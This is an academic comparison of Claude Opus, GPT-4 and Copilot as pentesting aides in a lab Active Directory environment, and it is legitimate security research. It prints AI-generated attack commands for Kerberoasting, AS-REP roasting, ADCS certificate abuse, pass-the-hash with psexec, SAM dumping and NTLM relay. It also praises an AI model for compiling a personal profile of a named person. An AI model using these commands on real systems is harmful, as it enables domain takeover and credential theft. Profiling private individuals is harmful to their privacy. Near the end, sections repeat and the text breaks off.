{"title": "Generative Artificial Intelligence-Supported Pentesting: A Comparison between Claude Opus, GPT-4, and Copilot", "authors": ["Antonio L\u00f3pez Mart\u00ednez", "Alejandro Cano", "Antonio Ruiz-Mart\u00ednez"], "abstract": "The advent of Generative Artificial Intelligence (GenAI) has brought a significant change to our society. GenAI can be applied across numerous fields, with particular relevance in cybersecurity. Among the various areas of application, its use in penetration testing (pentesting) or ethical hacking processes is of special interest. In this paper, we have analyzed the potential of leading generic-purpose GenAI tools-Claude Opus, GPT-4 from ChatGPT, and Copilot-in augmenting the penetration testing process as defined by the Penetration Testing Execution Standard (PTES). Our analysis involved evaluating each tool across all PTES phases within a controlled virtualized environment. The findings reveal that, while these tools cannot fully automate the pentesting process, they provide substantial support by enhancing efficiency and effectiveness in specific tasks. Notably, all tools demonstrated utility; however, Claude Opus consistently outperformed the others in our experimental scenarios.", "sections": [{"title": "1 Introduction", "content": "The advent of Large Language Models (LLMs) and their implementation in systems such as ChatGPT (OpenAI) has brought about a global revolution, reshaping various aspects of society [1, 2]. Alongside the rise of ChatGPT, other LLM-based conversational systems have also emerged [3], including Copilot (Microsoft), Google Gemini, LlamaChat (Meta) and Claude Opus.\nThe application of LLM technology has led to the development of various tools, including conversational assistant, image generation systems, code generation frameworks, and more. These tools can be employed across a diverse range of scenarios and domains, such as education, research, medicine, and image generation [4-9]. Among these domains, cybersecurity emerges as particularly significant.\nIn the field of cybersecurity, LLM technology can be leveraged for both defensive and malicious purposes [10-18]. Its applications range from deploying honeypots and ensuring code security to developing malware and generating code for malware detection. Additionally, LLMs can automate and scale threat deployment, identify zero-day vulnerabilities, assist in phishing and social engineering campaigns, draft cybersecurity policies and reports, provide consulting support, perform vulnerability scanning and exploitation, detect botnets, and more.\nWithin the field of cybersecurity, penetration testing (pentesting) or ethical hacking stands out as an area that can significantly benefit from the integration of this technology [19-21]. Specifically, it has the potential to combine automated pentesting powered by Artificial Intelligence (AI) with traditional methodologies. This hybrid approach can enhance the identification of potential weaknesses and vulnerabilities, detect exploitable entry points, and assess the effectiveness of security measures [19, 21, 22]. By leveraging AI, pentesters can perform their tasks more efficiently and intelligently [23].\nHilario et al. [21] highlighted several advantages of using generative AI in pentesting. These include improved efficiency, as vulnerabilities can be identified more quickly and automated test scenarios can be generated; enhanced creativity through the simulation of attacks and human behavior; the ability to leverage customized testing environments; the capacity for continuous learning and adaptation; and compatibility with legacy systems.\nFurthermore, Iqbal et al. [23] noted that tools like ChatGPT, when used to search for hacking-related information, often provide more relevant and precise results compared to traditional search engine queries. This observation aligns with the broader transformation in search methodologies brought about by AI-powered tools. Unlike conventional search engines, which require users to browse through numerous websites and iteratively refine their queries, AI tools like ChatGPT enable users to interact conversationally and receive filtered, contextually appropriate results, significantly reducing the time and effort involved [8]. However, this shift raises concerns about a potential decline in critical thinking skills among users, as the cognitive effort required to evaluate and synthesize information may be diminished [8].\nHilario et al. also highlight several challenges and limitations associated with the use of generative AI in pentesting. These include the need to avoid overreliance on AI, emphasizing the continued importance of human oversight to validate AI-generated"}, {"title": "2 PTES", "content": "The Penetration Testing Execution Standard (PTES) is a security framework designed to establish a standardized methodology for conducting penetration testing. As this standard was used to guide our analysis of the tools, a brief overview is provided in this section.\nThis methodology covers a wide range of areas within computer security and consist of 7 phases, each with its own technical guide. The phases are:\n1. Pre-engagement Interactions. This phase involves the establishment of the scope, objectives, and expectations of the penetration test. The client or target organization and the penetration testing teams or pentesters agree on the rules of engagement, timelines, and any legal or compliance requirements.\n2. Intelligence Gathering. This phase, also known as reconnaissance, involves collecting information about the target organization, systems, and infrastructure. Techniques may include passive and active scanning, open-source intelligence (OSINT), and footprinting."}, {"title": "3 Related Work", "content": "Prior to the introduction of GenAI in pentesting, Valea et al. [28] explored the automation of pentesting using the Metasploit Framework. Although their work does not focus exclusively on GenAI, it provides a foundation for understanding how automation and AI can be integrated into existing pentesting tools.\nCurrently, the scientific literature on leveraging Generative AI (GenAI) in pentesting, while rapidly expanding, remains limited due to the novelty of this research field. Below, we present the main works identified on this topic.\nAs highlighted by Gupta et al. [29], GenAI can be applied to both defensive and offensive security tasks. Notably, it can be used for automated hacking to evaluate system security and identify vulnerabilities. Their study also identified several attacks targeting the ChatGPT model, specifically the GPT-3.5 version.\nAdditionally, Nelson et al. [17] demonstrated that ChatGPT can assist in generating code for malware detection, significantly reducing the effort and time required for this task.\nIn [20], Happe and Cito explore the application of Generative AI in two distinct use cases: first, at a high level, as a task planning system; and second, at a low level,"}, {"title": "4 Generative AI tools", "content": "For the completion of this work, various generative Als have been studied. After its study, we made a selection and, subsequently, choosing some of them to perform our study. By analysing the obtained results, the aim was to find the tool that best adapts to each phase of PTES based on criteria that will be discussed later.\nThe reviewed literature highlights the growing interest in leveraging GenAI for pentesting and related cybersecurity tasks, demonstrating its potential to enhance efficiency, creativity, and automation in various scenarios. However, existing studies often focus on isolated tools, such as ChatGPT or Bard, and are limited to specific use cases, theoretical comparisons, or narrowly defined experimental setups. Moreover, there is a lack of comprehensive evaluations that compare multiple GenAI tools across all phases of a structured pentesting framework, such as the Penetration Testing Execution Standard (PTES). This gap underscores the need for a broader analysis to assess the applicability, strengths, and limitations of these tools in realistic and complex scenarios. Our work addresses this gap by providing a comparative analysis of several generic-purpose GenAI tools-Claude Opus, ChatGPT, and Copilot-within the context of PTES, offering valuable insights for both researchers and practitioners in the field."}, {"title": "4.1 Claude Opus", "content": "Claude 3, developed by Anthropic, represents the latest version of the Claude intelligence model. The Claude Opus model was selected for this study due to its high accuracy, rapid response times to complex requests, and ability to maintain coherence in extended conversations. These features make it particularly relevant for vulnerability analysis processes, which often require prolonged and detailed interactions. However, it is important to note a limitation: Claude Opus has a query limit of 70 tokens, which can restrict its usability in certain scenarios."}, {"title": "4.2 ChatGPT", "content": "ChatGPT, developed by OpenAI, is one of the most popular and widely utilized tools in its category. It is known for its versatility, extensive knowledge base, and user-friendly interface. For our tests, we used GPT-4 Turbo, the latest version of the Generative Pre-Trained Transformer (GPT) model available at the time via the paid subscription. This version demonstrated high precision, robust processing power, and efficiency in problem-solving. These attributes, combined with its ease of use, widespread popularity, and high degree of customization, made it an ideal choice for our study."}, {"title": "4.3 Microsoft Copilot", "content": "Copilot is a free tool with Internet access and continuously updated information. It is capable of integrating seamlessly with various Microsoft 365 applications through Graph. This tool was selected because it was already being utilized by Legitec in some of their security audits. By including Copilot in this study, we aim to compare a tool actively used by a real-world company with other tools primarily analyzed in academic contexts."}, {"title": "4.4 Google Gemini", "content": "Gemini, formerly known as Bard, is an AI model developed by Google. This model has its own dedicated website for direct use but can also be accessed through queries made via the Google search engine, eliminating the need to visit external websites. During our preliminary tests, we observed that its responses were more generic compared to other models and tended to stall during pentesting processes. Due to these limitations, we decided to exclude Gemini from an in-depth analysis in this study."}, {"title": "4.5 Other tools", "content": "In this section, we discuss additional tools that were initially considered for inclusion in this study. However, their incorporation was ultimately not feasible due to factors such as outdated functionality or incompatibility with our pentesting environment. These tools may still hold potential for future analysis in subsequent research. The tools considered are as follows:"}, {"title": "4.5.1 HackingBuddyGPT", "content": "HackingBuddyGPT4 is a privilege escalation assessment tool designed specifically for Linux systems. It is particularly well-suited for use during the post-exploitation phase of penetration testing."}, {"title": "4.5.2 BurpGPT", "content": "BurpGPT5 is a Burp Suite extension designed to enhance vulnerability detection by forwarding traffic passing through Burp to an OpenAI model. This tool was not included in our analysis as it is specifically focused on web applications and does not qualify as a general-purpose tool.\nDue to the large number of vulnerabilities present in the testing environment, none related to web applications were selected. As a result, BurpGPT was not included in this study, although it could have been considered if web-related vulnerabilities were part of the testing scope."}, {"title": "4.5.3 Pentest GPT", "content": "PentestGPT6 is a penetration testing tool that leverages the ChatGPT API to integrate generative AI capabilities into the application. It is specifically designed to automate various aspects of penetration testing. However, at the time of this study, it could not be utilized due to compatibility issues with the newer GPT-4 models. Despite this limitation, future updates suggest the potential for a generative AI model specifically tailored for pentesting applications."}, {"title": "5 Pentesting using GenAI tools", "content": "In this section, we present a comparison of various generic-purpose Generative AI (GenAI) tools to analyze how they support pentesters during the pentesting process within a defined scenario. We first describe the scenario where the tools were tested, followed by the methodology employed, and conclude with the results obtained from the pentesting process."}, {"title": "5.1 Testing environment: GOAD", "content": "The testing environment used for this study is the GOAD (Goad of Active Directory)7, a large-scale laboratory designed to simulate environments with numerous vulnerabilities related to Windows Server systems. This setup consisted of five virtual machines, two forests, three domains, and numerous user accounts, as illustrated in Figure 1.\nWhile this environment may not reflect the most common practices in organizations with well-established security policies, it is significantly more complex and comprehensive than the majority of virtual machines typically used for penetration testing in studies evaluating GenAI tools."}, {"title": "5.2 Methodology", "content": "To evaluate the GenAI tools in practice, we conducted a penetration testing process following the PTES methodology, focusing on the performance of Copilot, ChatGPT, and Claude Opus.\nCopilot was accessed via its dedicated website, whereas ChatGPT and Claude Opus were utilized through the Perplexity platform. This platform provides access to various premium AI models through a subscription plan and offers additional enhancements for query execution.\nSpecifically, following the phases defined in the PTES methodology, each of these tools was utilized, and their results were compared for each phase to identify their main advantages and disadvantages in performing the pentesting process. For each PTES phase, we provide the prompts used (translated from the original Spanish versions) along with the relevant results obtained for each tool."}, {"title": "5.3 Comparison of GenAI tools in PTES phases", "content": "In this section, we analyze how the selected GenAI tools perform across the various technical phases of the PTES methodology within the defined scenario.\nTo establish a baseline, the following table summarizes key aspects such as cost, token usage, and knowledge coverage:"}, {"title": "5.3.1 Reconnaissance", "content": "Since this is a virtual environment, conducting searches for public information through OSINT sources was not feasible. Therefore, we decided to use information from Legitec's company to complete this phase. The initial prompt used was:\nI am conducting a PTES test for Legitec, a company based in Murcia. This company has asked me to find all publicly available information on the Internet. Would you be able to find it?\nThe response to this prompt provided very general information. Consequently, we decided to explore whether the information could be extended by posing the following additional questions:\n\u2022 Could you give me more information about the high-ranking positions in this company, as well as their social media accounts?\n\u2022 Do they have any outsourced services?\n\u2022 Could you find information about their servers, DNS services, or employees?\n\u2022 Could you give me information about Alejandro Canos\nNext, we discuss the results obtained with each GenAI tool. For the sake of simplicity and conciseness, we will not present all the results generated by the tools across the different phases. Instead, we will focus on describing the most significant outcomes and, where relevant, the specific information or commands provided by the tools."}, {"title": "Claude Opus", "content": "It gathers general information about the company really fast. From this information, we can highlight that it shows what the company does, its headquarters, the number of companies that they have helped and the investment obtained through the Activa Ciberseguridad program (Specialized consulting program offering Spanish SMEs a free personalized cybersecurity assessment by the Spanish government) or participation in various events or conferences.\nClaude Opus is capable of answering the previous questions by obtaining the Fiscal Identification Code, the names of administrators, positions and names of some employees, and the IP address. It omits the question about Alejandro Cano, so it does not provide information when asked about a specific individual."}, {"title": "GPT-4", "content": "GPT-4 provides basic information about Legitec, including details previously mentioned. Additionally, it supplements this information with the company's phone number, email address, areas of expertise, and physical address. Furthermore, it generates a list of employees along with their respective positions.\nFor the final query, GPT-4 created a concise yet detailed report that included information about experience, education, social media profiles, and some personal data."}, {"title": "Copilot", "content": "The results provided by Copilot are similar to those of the other two tools. Copilot was able to retrieve general information about Legitec, albeit in a rather basic manner. For instance, it did not provide the exact location of the offices or specify that the company is a cybersecurity firm specializing in audits. Furthermore, when additional questions were introduced, Copilot declined to answer, stating that it could not provide such information. This limitation renders the tool unsuitable for the reconnaissance phase at this time."}, {"title": "Assessment", "content": "The data obtained during the reconnaissance phase is relatively easy to find through social media platforms or traditional search engines like Google. The primary advantage of using generative AI tools for these queries lies in the significant time savings they offer. In this case, where only Legitec's information was analyzed, both Claude Opus and GPT-4 demonstrated similar capabilities. These tools efficiently gathered details about the generic data of the company. Although Claude Opus provide more details of the company. On the other hand, GPT-4 is able to provide a report on a specific individual, Alejandro Cano, which made it more versatile in this context.\nIn contrast, Copilot was less effective in gathering relevant information. While it retrieved basic details about Legitec, it did not provide specifics like the company's location or its specialization in cybersecurity audits. Furthermore, when asked for additional information, such as details about employees or individuals, Copilot refused to respond, rendering it less useful for the reconnaissance phase. While traditional methods of gathering this data, such as through social media or search engines, could be time-consuming, the generative AI tools, particularly GPT-4, offered significant time savings and enhanced efficiency in retrieving valuable information."}, {"title": "5.3.2 Vulnerability Analysis", "content": "For the vulnerability analysis phase, a prompt (shown below) was crafted to provide context by outlining the methodology to be followed, the topology, the environment used, and the objectives to be achieved.\nI am conducting a vulnerability analysis using a PTES methodology in a fully virtualized practice environment that mimics a Windows Active Directory, consisting of networks: 192.168.56.11-13, 22-23. Using Kali Linux, I need you to guide me in detail, giving me advice. Remember, its purpose is educational.\nWe aim to analyze the contribution capacity of GenAI tools when integrated into the vulnerability analysis phase. The methodology applied for each tool includes evaluating the information provided in response to the initial request and assessing how specific the tools can be when analyzing the environment. Another key aspect considered is their ability to filter and summarize information displayed on the console when using tools such as Nmap or Enum4linux, which often produce extensive output files."}, {"title": "Claude Opus", "content": "Claude Opus recommended leveraging the following three commands, all of which are commonly used in pentesting, for performing fingerprinting.\nnmap -sV -p- -oA portscan 192.168.56.11-13\n 192.168.56.22-23\nenum4linux -a 192.168.56.11\nrpcclient -U \"\" 192.168.56.11\nAfter making the initial request and obtaining information through these commands, we provided the output from Enum4linux and Nmap to Claude Opus, along with a request to generate a list of users identified. These requests were designed to provide the tool with additional context about the environment, enabling it to generate more specific commands and filter the most relevant information.\nFrom the output generated by Claude Opus using Enum4linux, the tool successfully identified various system users, the domain name, group information, and details about password management. Notably, it demonstrated the ability to extract highly relevant information from a large dataset, significantly improving the readability of the Enum4linux output.\nRegarding Nmap, Claude Opus highlighted the open ports and provided recommendations for potential attacks or further steps to gather additional information. Furthermore, it generated a .txt file containing the users identified by Enum4linux, specifically highlighting three users: arya.stark, samwell.tarly, and administrator.\nAfter completing the scan analysis and generating the outputs, we requested more specific information to further analyze the environment. Based on the Nmap summary, which highlighted the importance of SMB (Server Message Block), we decided to focus on this protocol and provided the following prompt:\nGiven the information you've seen, recommend Netexec commands to obtain more information, as well as methods to enumerate via SMB\nAs a result, it provided several commands using Netexec, a pentesting tool designed to enumerate and gather information from various services such as SMB, LDAP, and Kerberos, making it highly useful in this environment. From the generated commands, we selected the following:\nnetexec.py -d NORTH -u \"*\" -p \"*\" 192.168.56.11 query group\nnetexec.py -d NORTH -u 'jon.snow' -p 'password' 192.168.56.11 query user *"}, {"title": "GPT-4", "content": "It started by showing us 2 commands and the execution of a program, which does not exist:\nnmap -sV -p- 192.168.56.11-13,22-23\nldapsearch -x -h 192.168.56.11 \u2013D\"cn=lector,dc=\nexample,dc=com\" -w password\n./testssl.sh 192.168.56.11:443\nFirst, it performed an Nmap scan to examine all services on the machines. Next, it conducted a search using the ldapsearch command to find various LDAP objects. Finally, the last command was not useful, as it instructed us to execute a script that does not exist, although it implied testing the HTTPS port (443).\nIn this first iteration, we observed that it omitted a very useful tool, Enum4linux. We then provided all the information obtained through Nmap to ChatGPT and analyzed the output it generated for us.\nThe text generated by ChatGPT indicates the domain name and IP address, which is similar to the output from Claude Opus. Both tools highlighted the open services and ports, as well as some vulnerabilities found in each. However, after analyzing the Enum4linux output, ChatGPT omitted mentioning the users within those systems. When asked to generate a list of users, it did not produce the list itself but instead instructed us to create it using the grep command, as shown below.\ngrep -OP 'Account: \\K[^ ]+'enum4linux.txt > usuarios.txt\nWhen highlighted vulnerabilities, it mentioned Microsoft SQL and Kerberos, both attacks were checked during the exploitation phase."}, {"title": "Copilot", "content": "It began by presenting three enumeration scripts (see Listings 1, 2, and 3), which are of moderate complexity and highly useful, as they perform multiple tasks within a single script. These scripts are designed for port scanning with Nmap, detecting IIS and MSSQL vulnerabilities, and enumeration with Enum4linux:"}, {"title": "Assessment", "content": "Upon completing the vulnerability analysis phase, our evaluation reveals that Claude Opus and GPT-4 are the most effective tools, while Copilot falls behind due to its message limitations. Claude Opus point outs in generating a comprehensive summary of open ports and offers detailed guidance on how to analyze vulnerabilities in these ports. It is particularly effective at identifying a wide range of vulnerabilities compared to the other tools, providing a thorough and actionable analysis. The recommendations provided by Claude Opus allows for a more complete assessment of potential weaknesses in the system (Kerberos, LDAP, SMB, RDP, WinRM, HTTP, and MSQL). Although in some cases is necessary to adjust the commands.\nGPT-4 also demonstrates strong capabilities showing potential vulnerabilities. It categorizes the vulnerabilities it identifies into general services and those specific to each host, helping to prioritize actions based on the context. While it is effective in generating actionable insights, it tends to be slightly less comprehensive than Claude Opus in its vulnerability identification, focusing more on categorization rather than providing extensive guidance on specific attack vectors.\nCopilot, although it provides useful multi-functional scripts for tasks like port scanning and enumeration, is limited by its inability to process large amounts of data effectively. This restriction makes it less useful when dealing with extensive outputs from tools like Nmap and Enum4linux. Additionally, while Copilot's scripts are generally comprehensive, its output is often less organized and does not offer the same depth of analysis or targeted recommendations as the other tools.\nIn summary, Claude Opus and GPT-4 stand out for their ability to provide detailed and context-specific analysis, with Claude Opus being particularly effective at identifying a broader range of vulnerabilities. Copilot still offers valuable assistance, especially for users looking for multi-functional scripts, but its limitations in data processing and organization reduce its effectiveness in the vulnerability analysis phase. Despite these differences, all three tools share a common strength in their ability to filter and summarize large volumes of data, enabling pentesters to quickly identify critical vulnerabilities in complex systems. To optimize the use of these tools, it is essential to specify the tools and environment being tested to ensure that the recommendations are tailored to the specific context."}, {"title": "5.3.3 Exploitation", "content": "In the exploitation phase, we utilized the vulnerabilities identified in the previous section to gain access to the systems."}, {"title": "Claude Opus", "content": "Claude began by showing us several methods to obtain SPNs, through Impacket and Rubeus tools, methods that we used since they are useful. In this case, we asked for more information about using Impacket to obtain user hashes, generating two attacks: Kerberoasting and AS-REP Roasting.\nGetUserSPNs.py -request -dc-ip 192.168.56.11 north.\n sevenkingdoms.local/brandon.stark:iseedeadpeople \n outputfile kerberoasting.hashes\ncrackmapexec ldap 192.168.56.11 -u brandon.stark -p\n iseedeadpeople'-d north.sevenkingdoms.local\n kerberoasting\npython GetNPUsers.py -dc-ip 192.168.56.11 -usersfile usuarios\n .txt -format hashcat -outputfile hashes_asrep.txt NORTH/\nThe use of these commands proved successful, resulting in the retrieval of passwords for several users. For the ADCS attack, it began by generating generic advice and suggesting the use of Certipy to obtain certificate data and check system templates. The command was well-structured despite using generic data. As we provided more domain context, however, the tool became more specific in its responses, adapting to the environment. Finally, it provided us with a list of steps to execute the ADCS attack, including lateral movements that could be performed using the certificate.\nAfter executing the commands and obtaining domain information, we provided the Certipy output to the tool. Once it analyzed the output, it generated ESC templates for ESC1, ESC2/3, and ESC4:\ncertipy req -u 'khal.drogo@essos.local' -p 'horse'-dc-ip\n '192.168.56.12' -ca 'ESSOS-CA' - template 'ESC1' -upn\n administrator@essos.local'\ncertipy req -u 'khal.drogo@essos.local' -p 'horse'-dc-ip\n '192.168.56.12'-template 'ESC2' -ca 'ESSOS-CA'\ncertipy req -u 'khal.drogo@essos.local -p 'horse'-dc-ip\n '192.168.56.12' -template 'ESC4' -ca 'ESSOS-CA'-upn\n administrator@essos.local'\nNext, we asked it to generate commands using a combination of username and password in the username:password format to properly exploit these templates, which proved to be highly useful. If we provided any output from these certificates, it would indicate how we could use the obtained information to gain access to the system through ADCS or by utilizing Mimikatz and Psexec."}, {"title": "GPT-4", "content": "ChatGPT began the request by recommending four tools to perform the ADCS attack, including Certipy, Rubeus, and Impacket, while also suggesting that ldap and certipy"}, {"title": "Copilot", "content": "Copilot proved to be the least effective for this phase. Although it provided environmental context, it wasted two messages- -one merely explaining in text how to perform the attack. After specifying that we were operating on a Kali machine, it generated the ADCS attack, outlining the steps to execute the attack and the commands to use. While the command it generated was fairly customized, there were still parts that lacked specificity. The commands it generated were as follows:\npython3 certipy.py -u khal.drogo -d essos.local\n -dc-ip <IP>-spn cifs/meereen.essos.local\nexport KRB5CCNAME=/tmp/ccache #to obtain the\n authentication ticket\nklist #to verify authentication\nOnce again, Copilot proved to be quite deficient in generating and distinguishing between different ESCs, as it generated the same command for all attacks, merely changing the name of the file."}, {"title": "Assessment", "content": "Upon concluding the exploitation phase, it was confirmed that Claude Opus and GPT-4 proved especially useful for generating specific attacks, offering great precision in formulating them. In contrast, Copilot lagged behind due to its limitations in generating customized commands. Both Claude Opus and Copilot were effective in generating payloads or commands for certain attacks, but Claude Opus stood out for its ability to adapt to the context of the environment. It provided tailored guidance for complex attacks such as Kerberos roasting, AS-REP roasting, and ADCS exploitation, generating highly specific and actionable commands.\nThe ideal tool for this phase has been Claude Opus, thanks to its precision, ease of use, and its great ability to maintain the context of all conversations. Its capacity to adapt responses to the specific environment and exploit vulnerabilities with greater specificity makes it the most effective tool for exploitation. While GPT-4 also offered useful guidance, it lacked the same level of customization and refinement seen in Claude Opus. Copilot, on the other hand, was less effective in this phase, providing more generic and less adaptable responses, which made it less useful for complex exploitation tasks."}, {"title": "5.3.4 Post Exploitation", "content": "In the previous phase, the ADCS exploitation was successfully carried out, resulting in the creation of an account on the system and establishing a connection to the domain meereen.essos.local.\nWe also attempted to establish a reverse shell (chosen for its simplicity and common use in pentesting tasks) for the IP 192.168.56.22, first by creating a user externally through the jon.snow account (via the Kerberos Relay Up attack). All of this was performed using Impacket.\nFor this phase, the following prompt was utilized:\nI am performing pentesting using a PTES methodology in a fully virtualized practice environment that mimics a Windows Active Directory, consisting of networks 192.168.56.11-13, 22-23. Using Kali Linux, I need you to guide me in detail providing advice. I have accessed through psexec.py administrator@meereen.essos.local -hashes aad3b435b51404eeaad3b435b51404ee:54296a48cd30259cc88095373cec24da to the administrator account. Tell me what to do for this post-exploitation phase"}, {"title": "Claude Opus", "content": "Claude Opus generates a list of potential objectives to achieve, providing commands to execute or steps to consider. Some of these objectives include:\n\u2022 Enumeration using whoami, hostname, ipconfig, etc. to gather information\n\u2022 Installation of Power View\n\u2022 Dumping hashes and using Metasploit's hashdump\n\u2022 Privilege escalation using PowerUp or by checking tokens of privileged users\n\u2022 Lateral movement with obtained hashes"}, {"title": "GPT-4", "content": "The commands generated by GPT-4 were very similar to those in the previous section. As before, the initial commands were adapted for a Windows device, with an approach focused on executing Mimikatz for performing SID Injection. However, the subsequent commands were neither well formulated nor coherent, as they instructed us to execute a non-existent .exe file. The generated command is shown below:\n# Execute: Mimikatz mimikatz.exe # Create a Golden Ticket"}, {"title": "Copilot", "content": "Copilot began by providing very generic commands, such as a list of commands to enumerate the network, enumerate the system, extract data, maintain persistence, escalate privileges, and clean up traces. We provided additional system information, but the only useful output generated was the method for obtaining the SAM from the device:\nreg save HKLM\\SAM SAM\nreg save HKLM\\SYSTEM SYSTEM\nAfterward, it recommended using netcat, scp, or smbclient commands to obtain these registry files, and then extract the hashes using samdump2.\nTo verify its validity, we provided a more specific prompt indicating our intention to perform a KrbRelayUp attack in an ACS environment, including the data obtained by executing the crackmapexec ldap command. However, it only provided two commands:\npython getST.py -spn cifs/WINTERFELL.north.sevenkingdoms. local\n -impersonate jon.snow north.sevenkingdoms.local/jon.snow\npython ntlmrelayx.py -t ldap://192.168.56.11 --delegate- access"}, {"title": "Assessment", "content": "In the context of post-exploitation, Claude Opus, GPT-4, and Copilot each demonstrated distinct strengths and limitations. Although privilege escalation on the target system was not successfully achieved, the methods applied were logically executed, and the tools were capable of correctly formulating the indicated attacks after two or more messages in the conversation. These tools provided precise commands to execute the mentioned attack, although the post-exploitation phase remains to be studied in more depth, as it was only tested for privilege escalation, leaving out other relevant actions such as hiding performed actions and lateral movements."}, {"title": "Assessment", "content": "Upon concluding the exploitation phase, it was confirmed that Claude Opus and GPT- 4 proved especially useful for generating specific attacks, offering great precision in formulating them. In contrast, Copilot lagged behind due to its limitations in generat- ing customized commands. Both Claude Opus and Copilot were effective in generating payloads or commands for certain attacks, but Claude Opus stood out for its ability to adapt to the context of the environment. It provided tailored guidance for com- plex attacks such as Kerberos roasting, AS-REP roasting, and ADCS exploitation, generating highly specific and actionable commands. The ideal tool for this phase has been Claude Opus, thanks to its precision, ease of use, and its great ability to maintain the context of all conversations. Its capacity to adapt responses to the specific environment and exploit vulnerabilities with greater specificity makes it the most effective tool for exploitation. While GPT-4 also offered useful guidance, it lacked the same level of customization and refinement seen in Claude Opus. Copilot, on the other hand, was less effective in this phase, providing more generic and less adaptable responses, which made it less useful for complex exploitation tasks."}, {"title": "5.3.4 Post Exploitation", "content": "In the previous phase", "utilized": "I am performing pentesting using a PTES methodology in a fully virtualized practice environment that mimics a Windows Active Directory, consisting of networks 192.168.56.1"}]}